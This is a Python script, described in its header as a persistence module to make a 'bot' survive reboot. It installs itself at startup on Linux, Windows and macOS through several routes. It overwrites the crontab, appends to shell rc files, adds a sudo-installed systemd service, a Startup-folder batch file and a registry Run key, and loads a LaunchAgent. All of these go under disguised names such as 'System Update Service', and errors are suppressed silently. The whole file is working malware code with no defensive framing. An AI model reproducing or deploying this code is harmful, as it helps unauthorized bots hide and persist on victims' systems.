#!/usr/bin/env python3
# PERSISTENCE MODULE - Make bot survive reboot
import os
import sys
import platform
import subprocess

class Persistence:
    def __init__(self, script_path=None):
        self.script_path = script_path or __file__
        self.system = platform.system()
        
    def install_linux(self):
        """Install persistence on Linux/Termux"""
        methods = []
        
        # Method 1: Crontab
        try:
            cron_line = f"@reboot python3 {self.script_path} &\n"
            with open("/tmp/cronjob", 'w') as f:
                f.write(cron_line)
            os.system("crontab /tmp/cronjob 2>/dev/null")
            methods.append("crontab")
        except:
            pass
        
        # Method 2: Bashrc
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            with open(bashrc, 'a') as f:
                f.write(f"\npython3 {self.script_path} &\n")
            methods.append("bashrc")
        except:
            pass
        
        # Method 3: Zshrc
        try:
            zshrc = os.path.expanduser("~/.zshrc")
            with open(zshrc, 'a') as f:
                f.write(f"\npython3 {self.script_path} &\n")
            methods.append("zshrc")
        except:
            pass
        
        # Method 4: Systemd (if root)
        try:
            service = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=python3 {self.script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            with open("/tmp/systemd-update.service", 'w') as f:
                f.write(service)
            os.system("sudo mv /tmp/systemd-update.service /etc/systemd/system/ 2>/dev/null")
            os.system("sudo systemctl enable systemd-update.service 2>/dev/null")
            os.system("sudo systemctl start systemd-update.service 2>/dev/null")
            methods.append("systemd")
        except:
            pass
        
        return methods
    
    def install_windows(self):
        """Install persistence on Windows"""
        methods = []
        
        # Method 1: Startup Folder
        try:
            startup = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            with open(f"{startup}\\system_update.bat", 'w') as f:
                f.write(f"python {self.script_path}")
            methods.append("startup_folder")
        except:
            pass
        
        # Method 2: Registry
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "SystemUpdate", 0, winreg.REG_SZ, f"python {self.script_path}")
            winreg.CloseKey(handle)
            methods.append("registry")
        except:
            pass
        
        return methods
    
    def install_macos(self):
        """Install persistence on macOS"""
        methods = []
        
        # Launch Agent
        try:
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{self.script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
            with open(os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist"), 'w') as f:
                f.write(plist)
            os.system("launchctl load ~/Library/LaunchAgents/com.system.update.plist")
            methods.append("launch_agent")
        except:
            pass
        
        return methods
    
    def install(self):
        """Main install method"""
        print(f"[*] Installing persistence on {self.system}")
        
        if self.system == "Linux":
            methods = self.install_linux()
        elif self.system == "Windows":
            methods = self.install_windows()
        elif self.system == "Darwin":
            methods = self.install_macos()
        else:
            methods = []
        
        if methods:
            print(f"[+] Persistence installed via: {', '.join(methods)}")
        else:
            print("[!] No persistence method worked")
        
        return methods

if __name__ == "__main__":
    p = Persistence(__file__)
    p.install()
